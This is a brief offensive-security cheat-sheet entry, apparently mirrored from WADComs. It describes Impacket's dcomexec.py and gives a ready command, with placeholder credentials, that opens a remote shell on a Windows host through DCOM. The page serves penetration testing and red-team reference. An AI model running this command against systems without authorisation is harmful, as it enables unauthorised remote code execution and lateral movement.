# WADComs: Impacket-DCOMExec

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `Password`, `Username`

**Sistema:** `Linux`, `Windows`

## Descripción

Impacket's dcomexec.py provides an interactive shell on the Windows host similar to wmiexec.py, but using varying DCOM endpoints.

Currently supports MMC20.Application, ShellWindows, and ShellBrowserWindow DCOM objects.

Command Reference:

	Target IP: 10.10.10.1

	Domain: test.local

	Username: john

	Password: password123

	DCOM Object: MMC20

## Comando

```bash
python3 dcomexec.py -object MMC20 test.local/john:password123@10.10.10.1
```

## Referencias

- https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py
- https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/
